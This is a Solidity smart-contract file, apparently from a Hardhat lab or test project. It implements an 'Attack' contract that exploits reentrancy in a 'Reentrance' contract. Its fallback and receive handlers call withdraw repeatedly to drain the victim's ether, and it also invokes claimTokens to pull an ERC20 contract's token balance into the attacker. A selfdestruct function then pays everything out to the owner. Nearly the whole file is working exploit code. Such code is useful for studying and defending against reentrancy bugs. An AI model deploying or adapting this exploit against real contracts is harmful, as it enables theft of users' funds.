// SPDX-License-Identifier: MIT
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITest {
    function claimTokens(
        address _token,
        address _to,
        uint256 _balance
    ) external;
}

contract Attack {
    Reentrance reentrance;
    address public owner;
    uint public number;

    IERC20 erc20;

    modifier ownerOnly() {
        require(msg.sender == owner);
        _;
    }

    fallback() external payable {
        if (msg.sender == address(reentrance)) {
            number = number + 1;
            console.log(
                "[attack fallback] %s times called, attack_balance:%s , re_balance:%s ",
                number,
                address(this).balance / (10**18),
                address(reentrance).balance / (10**18)
            );
            reentrance.withdraw(address(this), msg.value, address(erc20));
        }
    }

    receive() external payable {
        if (msg.sender == address(reentrance)) {
            if (number == 0) {
                console.log(
                    "send Token once from %s to %s",
                    address(this),
                    msg.sender
                );
                erc20.transfer(msg.sender, 50000 * 10**18);
            }
            number = number + 1;
            console.log(
                "[attack receive] %s times called, attack_balance:%s , re_balance:%s ",
                number,
                address(this).balance / (10**18),
                address(reentrance).balance / (10**18)
            );
            if (address(reentrance).balance / (10**18) > 40) {
                reentrance.withdraw(address(this), msg.value, address(erc20));
            }
            console.log("Erc20 balance %s ", erc20.balanceOf(address(erc20)));
            if (erc20.balanceOf(address(erc20)) > 50000 * 10**18) {
                ITest(address(erc20)).claimTokens(
                    address(erc20),
                    address(this),
                    0
                );
                console.log(
                    "Erc20 balance %s this erc20 balance %s",
                    erc20.balanceOf(address(erc20)),
                    erc20.balanceOf(address(this))
                );
            }
        }
    }

    constructor() payable {
        owner = msg.sender;
    }

    function setVictim(Reentrance _victim) public ownerOnly {
        reentrance = _victim;
        console.log("Attack setVictim is call from %s", msg.sender);
    }

    function startAttack(uint _amount, address _erc20) public ownerOnly {
        erc20 = IERC20(_erc20);
        reentrance.deposit{value: _amount}();
        reentrance.withdraw(address(this), _amount / 2, address(erc20));
    }

    function byebye() public {
        selfdestruct(payable(owner));
    }
}
